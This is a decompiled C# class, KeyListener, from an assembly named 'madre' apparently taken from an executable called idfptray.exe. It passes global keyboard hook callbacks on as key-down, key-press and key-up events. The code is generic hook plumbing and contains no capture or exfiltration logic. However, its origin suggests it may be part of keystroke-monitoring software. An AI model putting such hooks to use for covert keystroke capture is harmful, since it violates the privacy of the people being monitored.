// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.MouseKeyHook.Implementation.KeyListener
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System.Collections.Generic;
using System.Windows.Forms;
using VERMELHO265MONARCA.Core.MouseKeyHook.WinApi;

namespace VERMELHO265MONARCA.Core.MouseKeyHook.Implementation
{
  internal abstract class KeyListener : BaseListener, IKeyboardEvents
  {
    protected KeyListener(Subscribe subscribe)
      : base(subscribe)
    {
    }

    public event KeyEventHandler KeyDown;

    public event KeyPressEventHandler KeyPress;

    public event KeyEventHandler KeyUp;

    public void InvokeKeyDown(KeyEventArgsExt e)
    {
      // ISSUE: reference to a compiler-generated field
      KeyEventHandler keyDown = this.KeyDown;
      if (keyDown == null || e.Handled || !e.IsKeyDown)
        return;
      keyDown((object) this, (KeyEventArgs) e);
    }

    public void InvokeKeyPress(KeyPressEventArgsExt e)
    {
      // ISSUE: reference to a compiler-generated field
      KeyPressEventHandler keyPress = this.KeyPress;
      if (keyPress == null || e.Handled || e.IsNonChar)
        return;
      keyPress((object) this, (KeyPressEventArgs) e);
    }

    public void InvokeKeyUp(KeyEventArgsExt e)
    {
      // ISSUE: reference to a compiler-generated field
      KeyEventHandler keyUp = this.KeyUp;
      if (keyUp == null || e.Handled || !e.IsKeyUp)
        return;
      keyUp((object) this, (KeyEventArgs) e);
    }

    protected override bool Callback(CallbackData data)
    {
      KeyEventArgsExt downUpEventArgs = this.GetDownUpEventArgs(data);
      IEnumerable<KeyPressEventArgsExt> pressEventArgs = this.GetPressEventArgs(data);
      this.InvokeKeyDown(downUpEventArgs);
      foreach (KeyPressEventArgsExt e in pressEventArgs)
        this.InvokeKeyPress(e);
      this.InvokeKeyUp(downUpEventArgs);
      return !downUpEventArgs.Handled;
    }

    protected abstract IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data);

    protected abstract KeyEventArgsExt GetDownUpEventArgs(CallbackData data);
  }
}
